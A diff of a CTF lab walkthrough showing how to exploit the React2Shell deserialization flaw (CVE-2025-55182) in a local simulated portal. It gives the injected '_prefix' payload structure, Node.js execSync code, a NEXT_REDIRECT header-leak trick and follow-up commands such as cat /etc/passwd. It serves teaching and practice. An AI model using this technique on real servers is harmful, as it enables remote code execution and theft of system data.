@@ -1,26 +1,73 @@
-# 🚩 CTF Walkthrough: Exploiting CVE-2025-55182
+# 🚩 CTF Walkthrough: Exploiting React2Shell (CVE-2025-55182)
 
-This guide describes how to manually exploit the **CorpSecure Portal** (simulated vulnerable target) using `curl`. This demonstrates Remote Code Execution (RCE) via blind mathematical injection.
+This guide is designed to help you **understand** the vulnerability, not just run a script. We will break down the attack into logical steps.
 
 ---
 
-## 🏗️ 1. Setup
+## 🏗️ 1. Setup & Reconnaissance
 
-Start the CTF challenge target:
+First, ensure your target is running (see README).
+Open it in your browser: `http://localhost:5555`
 
-```bash
-cd ctf_challenge
-docker-compose up --build
+### 🕵️‍♂️ The Objective
+We want to achieve **Remote Code Execution (RCE)** on the server.
+The application seems simple, but it processes **Server Actions** using a serialized format (React Server Components).
+
+---
+
+## 🧩 2. Understanding the Injection
+
+This application uses a vulnerable version of a library that allows **insecure deserialization** or **eval-like** behavior when processing specific multipart forms.
+
+The vulnerability lies in how the server handles the `_response` field in a JSON payload. If we can inject a `_prefix` property, the server will **execute** it as code.
+
+### The Payload Structure
+We need to construct a multipart request with this JSON structure:
+
+```json
+{
+  "_response": {
+    "_prefix": "YOUR_MALICIOUS_NODEJS_CODE"
+  }
+}
 ```
-Target is now live at: `http://localhost:5555`
 
 ---
 
-## 💥 2. The Exploit (Manual)
+## �️ 3. Crafting the Payload (Step-by-Step)
 
-We will inject a command into the Server Action processing logic. Specifically, we will ask the server to calculate `1337 * 2`.
+We will use `curl` to send this request.
 
-Copy and paste this command into your terminal:
+### Step 3.1: The Command
+We want to run a simple math calculation to prove RCE: `1337 * 2`.
+In Node.js, we can use `child_process`:
+
+```javascript
+/* Analysis ONLY - Do not run this directly in node */
+var output = process.mainModule.require('child_process').execSync('echo $((1337*2))').toString().trim();
+```
+
+### Step 3.2: Exfiltrating the Result
+We can't see the console log of the server easily. We need the server to **send the result back to us**.
+The vulnerability exploits a specific error type (`NEXT_REDIRECT`) to leak data in the HTTP response headers.
+
+We wrap our code to throw this error with our `output`:
+
+```javascript
+throw Object.assign(new Error('NEXT_REDIRECT'), {
+    digest: `NEXT_REDIRECT;push;/login?a=${output};307;`
+});
+```
+
+---
+
+## 🚀 4. Exploitation
+
+Now, let's put it all together into the final `curl` command.
+
+**⚠️ Challenge:** Try to predict what the response header `Location` will contain before you run it!
+
+Copy and run this in your terminal:
 
 ```bash
 curl -i -X POST http://localhost:5555/ \
@@ -30,18 +77,19 @@ curl -i -X POST http://localhost:5555/ \
 
 ---
 
-## 🏆 3. Verification (The Flag)
+## 🏆 5. Analysis & Verification
 
-Look at the **Response Headers** in your terminal output.
+Look at the output. You should see a **303 See Other** or **307 Temporary Redirect**.
+Check the headers:
 
-**Vulnerable Response:**
 ```http
-HTTP/1.1 303 See Other
-X-Powered-By: Express
 X-Action-Redirect: /dashboard?session=2674&admin=true
 Location: /dashboard?session=2674
-...
 ```
 
-### Why is this RCE?
-The server executed `echo $((1337*2))`, calculated `2674`, and returned it in the HTTP Header. We controlled the server's execution logic! 🚀
+### 🧠 Critical Thinking
+1.  **What is `2674`?** -> It is the result of `1337 * 2`.
+2.  **What does this mean?** -> The server executed our math operation!
+3.  **What else could you run?** -> `whoami`, `ls`, `cat /etc/passwd`...
+
+**Congratulations! You have successfully analyzed and exploited React2Shell.** �
